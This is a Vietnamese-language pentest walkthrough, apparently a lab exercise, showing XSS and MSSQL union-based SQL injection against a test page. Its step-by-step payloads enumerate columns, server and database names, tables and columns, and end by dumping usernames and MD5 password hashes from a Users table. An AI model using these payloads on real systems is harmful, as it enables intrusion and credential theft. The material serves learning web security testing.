_10. Th3 2020_

# VN*

### Introduction

URL: [Trang thử nghiệm][main]

### Documents

Tự động tìm lỗi: [Sử dụng BurpSuite Crawl][burpcrawl]

Xử lý bằng tay: [Hướng dẫn từ BurpSuite][burpunion]

Giải đáp: [Đáp án][answer]
	
### Cross-site scripting (XSS)

Dấu hiệu nhận biết sử dụng trường `Số`:
	
	1">
	
![XSSstep1][imgxss1]

Dễ nhận ra với payload trên, phía bên phải form xuất hiện dấu `">` bên ngoài input. Đó là dấu hiệu điển hình của 1 lỗi XSS trong form input

### Khai thác XSS

Thử lại với 1 payload chứa hàm onclick (khi bấm vào sẽ thực thi), ta có payload mới

	1" onclick="alert('test XSS')

![XSSstep2][imgxss2]

Bấm vào input lần nữa, click event được ghi nhận & hàm alert trong onclick được thực thi.

Bấm F12 để mở Chrome Dev Tools.

- Ban đầu:

	`<input type="text" name="intso" value="1">`

- Khi nhập:

	`<input type="text" name="intso" value="1">">`
	
- Kết quả:

	`<input type="text" name="intso" value="1">">`


### SQL Injection

Nhận biết loại SQL: MSSQL, chi tiết để sau

Dấu hiệu nhận biết sử dụng trường `Số`:

	1' order by 1--

Kết quả trả về giống như khi sử dụng `1`.  Đó là dấu hiệu điển hình của 1 lỗi SQL Injection.

### Khai thác SQLi

- Bước 1: Tìm số cột của table hiện tại

	-1' order by n--

với n được thử lần lượt từ 1 lên đến khi lỗi. n sẽ là giá trị phù hợp trước khi lỗi.

Lỗi được tính là khi kết quả trả về `ADODB.Recordset error 'xxxxxxxx'`

Kết quả:
	
	10

![SQListep1][imgsqlistep1]

- Bước 2: Ta đã biết được số cột, giờ ta sẽ tìm cột chứa giá trị chuỗi ký tự.

Lần lượt thử:

	-1' UNION SELECT 'a',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
	
Nếu lỗi được trả về, ta tiếp tục thay 'a' vào các giá trị tiếp theo cho đến hết

	-1' UNION SELECT NULL,'a',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
	-1' UNION SELECT NULL,NULL,'a',NULL,NULL,NULL,NULL,NULL,NULL,NULL--
	...
	
	-1' UNION SELECT NULL,NULL,'a',NULL,'a',NULL,NULL,NULL,NULL,NULL--
	
Kết quả: 2 vị trí

![SQListep2][imgsqlistep2]

Từ 2 vị trí này, tạo payload để lấy thông tin server

	-1' UNION SELECT NULL,NULL,@@version,NULL,@@SERVERNAME,NULL,NULL,NULL,NULL,NULL--
	
	-1' UNION SELECT NULL,NULL,user_name(),NULL,db_name(),NULL,NULL,NULL,NULL,NULL--

Từ 2 vị trí này, tạo payload để lấy được tên bảng

	-1' UNION SELECT NULL,NULL,table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL from (select top 1000 table_name from information_schema.tables order by 1) as x order by 1 desc--

Tuy nhiên trang đã giới hạn số mục được hiện trên màn hình, ta có thể thấy có 125 văn bản, trong khi hiện chỉ có 20 văn bản. Nút phân trang cũng không sử dụng được, vì chúng ta đang sử dụng 1 payload "không chính thống"

![SQListep3][imgsqlistep3]

Để giải quyết vấn đề này, ta cần thực thi bằng lệnh SELECT từ bản ghi thứ 20 trở đi

	-1' UNION SELECT NULL,NULL,table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL from (select ROW_NUMBER() OVER (ORDER BY table_name ASC) AS rowNum, table_name from information_schema.tables) as x where rowNum >= 20 order by 1 desc--

Thay rowNum để hiện hết tên các bảng

Tương tự đối với tên cột

	-1' UNION SELECT NULL,NULL,column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL from (select top 1000 column_name from information_schema.columns where table_name ='' order by 1) as x order by 1 desc--

Thay tên bảng vào '' để hiện tên các cột

![SQListep4][imgsqlistep4]

Thử lấy kết quả của bảng Users

	-1' UNION SELECT NULL,NULL,Username,NULL,Password,NULL,NULL,NULL,NULL,NULL from Users--
	
![SQListep5][imgsqlistep5]

Password đã bị mã hóa MD5.

Hoàn thành!

  [main]: https://192.168.3.11/home/?netoffice
  [burpcrawl]: https://portswigger.net/support/using-burp-to-detect-sql-injection-flaws
  [burpunion]: https://portswigger.net/web-security/sql-injection/union-attacks
  [answer]: http://securityidiots.com/Web-Pentest/SQL-Injection/MSSQL/MSSQL-Union-Based-Injection.html
  [imgxss1]: assets/images/ex/1-xss.PNG
  [imgxss2]: assets/images/ex/2-xss.PNG
  [imgsqlistep1]: assets/images/ex/1-sqli.PNG
  [imgsqlistep2]: assets/images/ex/2-sqli.PNG
  [imgsqlistep3]: assets/images/ex/3-sqli.PNG
  [imgsqlistep4]: assets/images/ex/4-sqli.PNG
  [imgsqlistep5]: assets/images/ex/5-sqli.PNG
